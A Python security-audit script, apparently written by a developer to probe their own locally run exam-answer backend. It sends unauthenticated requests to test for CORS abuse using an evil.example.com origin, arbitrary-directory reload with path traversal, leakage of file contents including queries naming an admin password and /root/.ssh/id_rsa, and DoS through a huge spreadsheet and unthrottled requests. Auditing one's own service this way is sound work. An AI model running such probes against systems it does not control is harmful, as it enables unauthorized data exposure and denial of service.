# -*- coding: utf-8 -*-
"""Security probe against the AS-IS backend (simulating an unauthenticated attacker
over the network). Run locally against 127.0.0.1:8766 only."""
import json
import time
import urllib.request
import urllib.error

BASE = 'http://127.0.0.1:8766'
VICTIM = r'D:\Autoexam\tools\_deploytest\victim_docs'
BIG = r'D:\Autoexam\tools\_deploytest'


def req(method, path, payload=None, headers=None, timeout=30):
    body = json.dumps(payload).encode('utf-8') if payload is not None else None
    h = {'Content-Type': 'application/json; charset=utf-8'} if body else {}
    if headers:
        h.update(headers)
    r = urllib.request.Request(BASE + path, data=body, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            data = resp.read()
            return resp.status, resp.headers, data, time.time() - t0
    except urllib.error.HTTPError as e:
        return e.code, e.headers, e.read(), time.time() - t0
    except Exception as e:
        return None, None, str(e).encode(), time.time() - t0


print('=' * 78)
print('审计测试 A —— 基础暴露面')
print('=' * 78)

# A1 无鉴权直接查答案
st, hd, data, dt = req('GET', '/api/health')
print(f'[A1] GET /api/health -> {st}  folder泄露={json.loads(data)["folder"]}  (无需任何凭证)')

# A2 交互式文档暴露
st, _, data, _ = req('GET', '/docs')
print(f'[A2] GET /docs -> {st}  (Swagger 交互文档, {"已暴露" if st == 200 else "未暴露"})')
st, _, data, _ = req('GET', '/openapi.json')
if st == 200:
    schema = json.loads(data)
    print(f'[A2] GET /openapi.json -> {st}  (暴露全部接口 schema, {len(schema.get("paths", {}))} 个路径)')

# A3 CORS 通配 + 无鉴权：任意网站 JS 都能读取
st, hd, data, _ = req('GET', '/api/health', headers={'Origin': 'https://evil.example.com'})
print(f'[A3] 带上 Origin: https://evil.example.com -> status={st} '
      f'Access-Control-Allow-Origin={hd.get("Access-Control-Allow-Origin")!r}  '
      f'(跨域 JS 可读 => 恶意网页可借受害者浏览器调用api)')

print()
print('=' * 78)
print('审计测试 B —— 未授权任意目录读取（核心漏洞）')
print('=' * 78)

# B1 未授权 /api/reload 指向任意目录
st, _, data, dt = req('POST', '/api/reload', {'folder': VICTIM})
print(f'[B1] POST /api/reload 任意目录 {VICTIM!r}')
print(f'     -> {st} {data[:160]!r}  用时{dt:.1f}s  (无需凭证即可切换题库目录)')

# B2 读“受害者”内容：/api/banks 列出文件名/标题
st, _, data, _ = req('GET', '/api/banks')
print(f'[B2] GET /api/banks -> {data!r}'[:300])

# B3 通过 /api/query 把“机密”内容整条读出来（等于任意 xlsx 内容泄露）
probe = [
    ('single', '服务器管理员密码？'),
    ('judge', 'SSH 密钥存放在 /root/.ssh/id_rsa？'),
]
for typ, stem in probe:
    st, _, data, _ = req('POST', '/api/query', {'type': typ, 'stem': stem})
    j = json.loads(data)
    print(f'[B3] query("{stem}") -> answers={j.get("answers")} file={j.get("file")}')

# B4 路径穿越（..）也被接受
st, _, data, _ = req('POST', '/api/reload', {'folder': 'D:/Autoexam/tools/_deploytest/../_deploytest/victim_docs'})
print(f'[B4] 路径含 ../ -> {st} (相对路径/穿越被接受)')

print()
print('=' * 78)
print('审计测试 C —— 无鉴权 DoS')
print('=' * 78)

# C1 让后端加载 5.4MB / 12万行 xlsx（阻塞 worker，CPU/内存吃满）
st, _, data, dt = req('POST', '/api/reload', {'folder': BIG}, timeout=60)
print(f'[C1] reload dos_big.xlsx(12万行) -> {st} 用时{dt:.1f}s  {str(data)[:80]!r}')
# C2 reload 期间再来一发 query，验证无并发保护、其它请求被拖慢/阻塞
st, _, data, dt = req('POST', '/api/query', {'type': 'single', 'stem': '城市轨道交通建设工程竣工验收不合格的，不得开展(   )安全评估。'}, timeout=60)
print(f'[C2] DoS 期间 query 请求 -> 用时{dt:.1f}s  (证明可被放大阻塞)')
# C3 无鉴权刷接口（大批量 query 无频率限制）
t0 = time.time()
for i in range(30):
    req('POST', '/api/query', {'type': 'single', 'stem': f'第 {i} 个随便的题干'}, timeout=10)
print(f'[C3] 连发 30 次 query 无任何限制 -> 用时{time.time()-t0:.1f}s (无限流)')

print()
print('=' * 78)
print('审计测试 D —— 路径/信息泄露')
print('=' * 78)
st, _, data, _ = req('GET', '/api/health')
print(f'[D1] health 返回服务器绝对路径: {data!r}')
st, _, data, _ = req('POST', '/api/query', {'type': 'single', 'stem': '不存在不存在的题不存在'})
print(f'[D2] 未命中查询返回体: {data!r}')
print()
print('probe done')
